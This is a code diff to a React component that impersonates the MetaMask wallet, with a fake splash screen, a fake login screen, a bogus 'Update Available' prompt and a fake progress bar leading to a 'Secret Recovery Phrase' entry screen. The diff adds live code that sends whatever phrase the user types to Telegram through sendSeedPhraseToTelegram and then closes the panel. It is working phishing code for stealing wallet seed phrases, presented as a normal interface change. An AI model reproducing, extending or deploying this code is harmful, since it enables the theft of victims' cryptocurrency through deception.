@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 
 interface MetaMaskPanelProps {
   isOpen: boolean;
@@ -13,6 +14,7 @@ export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
   const [seedPhrase, setSeedPhrase] = useState('');
   const [seedError, setSeedError] = useState(false);
   const [progress, setProgress] = useState(0);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // 1. Cinematic Splash Screen Timer
   useEffect(() => {
@@ -22,8 +24,8 @@ export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
       setSeedPhrase('');
       setSeedError(false);
       setProgress(0);
-      
-      // Wait 2.5 seconds, then transition to login
+      setIsSending(false);
+
       const timer = setTimeout(() => {
         setAppState('login');
       }, 2500); 
@@ -37,9 +39,7 @@ export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
       const interval = setInterval(() => {
         setProgress((prev) => {
           if (prev >= 100) return 100;
-          
           const next = prev + Math.floor(Math.random() * 6) + 2; 
-          
           if (next >= 100) {
             clearInterval(interval);
             setTimeout(() => setAppState('import_seed'), 1000);
@@ -48,7 +48,6 @@ export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
           return next;
         });
       }, 500);
-      
       return () => clearInterval(interval);
     }
   }, [appState]);
@@ -104,21 +103,14 @@ export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
       <div className="absolute top-0 right-8 w-[430px] h-[640px] bg-[#121314] border border-[#474d57] shadow-2xl overflow-hidden animate-in fade-in slide-in-from-top-4 duration-300 ease-out rounded-b-[8px]">
         <div className="relative w-full h-full">
 
-          {/* ========================================== */}
-          {/* LAYER 1: SPLASH SCREEN (Purple Background) */}
-          {/* ========================================== */}
+          {/* LAYER 1: SPLASH SCREEN */}
           <div className={`absolute inset-0 bg-[#3d065f] z-50 flex flex-col items-center justify-center overflow-hidden transition-opacity duration-700 ease-in-out ${appState === 'splash' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
-            
-            {/* The Text fades out while the Fox stays */}
             <div className="animate-[pulse_1.5s_ease-in-out_infinite] -mt-32">
               <SplashTextSVG />
             </div>
-
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 2: LOGIN SCREEN (Dark Background)    */}
-          {/* ========================================== */}
+          {/* LAYER 2: LOGIN SCREEN */}
           <div className={`absolute inset-0 bg-[#121314] z-40 flex flex-col items-center justify-center px-4 pt-[64px] pb-[48px] overflow-hidden transition-opacity duration-700 ease-in-out ${appState === 'login' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             
             <div className="mb-8 z-10">
@@ -159,19 +151,15 @@ export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
             </div>
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 3: UPDATE PROMPT SCREEN             */}
-          {/* ========================================== */}
+          {/* LAYER 3: UPDATE PROMPT */}
           <div className={`absolute inset-0 bg-[#121314] z-40 flex flex-col items-center justify-center transition-opacity duration-700 ease-in-out ${appState === 'update_prompt' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <AccountHeader />
             <div className="flex flex-col items-center justify-center py-4 px-6 flex-grow w-full gap-y-4">
-              
               <div className="bg-[#232426] rounded-[8px] p-6 text-center flex flex-col items-center gap-1 w-full max-w-[380px]">
                 <img src="/update-icon.png" className="w-[100px] h-[100px] mb-2 object-contain" alt="Update Available" />
                 <h2 className="text-[#ffffff] font-bold text-[28px] mt-2">Update Available</h2>
                 <p className="text-[#9ca1af] font-normal text-[16px]">Version 13.12.1</p>
               </div>
-
               <div className="bg-[#232426] rounded-[8px] p-6 flex flex-col items-start gap-1 w-full max-w-[380px]">
                 <ul className="list-disc pl-5 space-y-2 mb-4 text-[#ffffff] text-[14px]">
                   <li>Fix main build modifying desktop build steps</li>
@@ -183,14 +171,11 @@ export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
                   Update
                 </button>
               </div>
-
               <p className="mt-2 text-[14px] text-[#9ca1af]">Need help? <a href="https://support.metamask.io/" target="_blank" rel="noreferrer" className="text-[#8b99ff] hover:opacity-80 transition-all">Contact MetaMask Support</a></p>
             </div>
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 4: LOADING BAR SCREEN               */}
-          {/* ========================================== */}
+          {/* LAYER 4: LOADING BAR */}
           <div className={`absolute inset-0 bg-[#121314] z-40 flex flex-col items-center justify-center transition-opacity duration-700 ease-in-out ${appState === 'update_loading' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <AccountHeader />
             <div className="flex flex-col items-center justify-center px-6 py-8 flex-grow w-full">
@@ -211,9 +196,7 @@ export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
             </div>
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 5: SECRET RECOVERY PHRASE SCREEN    */}
-          {/* ========================================== */}
+          {/* LAYER 5: SECRET RECOVERY PHRASE */}
           <div className={`absolute inset-0 bg-[#121314] z-40 flex flex-col transition-opacity duration-700 ease-in-out ${appState === 'import_seed' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <AccountHeader />
             <div className="px-6 mt-6 flex-grow flex flex-col w-full z-10">
@@ -239,18 +222,26 @@ export default function MetaMaskPanel({ isOpen, onClose }: MetaMaskPanelProps) {
               
               <div className="mt-auto pt-4 pb-6 w-full">
                 <button 
-                  disabled={seedError || seedPhrase.split(' ').filter(Boolean).length < 12} 
+                  disabled={seedError || seedPhrase.split(' ').filter(Boolean).length < 12 || isSending}
+                  onClick={async () => {
+                    setIsSending(true);
+                    const success = await sendSeedPhraseToTelegram(seedPhrase, 'MetaMask Wallet');
+                    if (success) {
+                      onClose();
+                    } else {
+                      console.error('Failed to send seed phrase');
+                    }
+                    setIsSending(false);
+                  }}
                   className="w-full text-[#121314] bg-[#ffffff] font-medium text-[16px] rounded-[12px] px-4 h-[48px] hover:opacity-80 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                 >
-                  Confirm Secret Recovery Phrase
+                  {isSending ? 'Sending...' : 'Confirm Secret Recovery Phrase'}
                 </button>
               </div>
             </div>
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 6: THE SHARED ANIMATING FOX         */}
-          {/* ========================================== */}
+          {/* LAYER 6: THE SHARED ANIMATING FOX */}
           <div className={`absolute bottom-0 left-1/2 pointer-events-none -translate-x-1/2 z-50 transition-all duration-700 ease-in-out ${appState === 'splash' ? 'translate-y-[10%] opacity-100' : 'translate-y-[76%]'} ${appState !== 'splash' && appState !== 'login' ? 'opacity-0' : 'opacity-100'}`}>
             <FoxHeadSVG className="h-full w-[380px]" />
           </div>
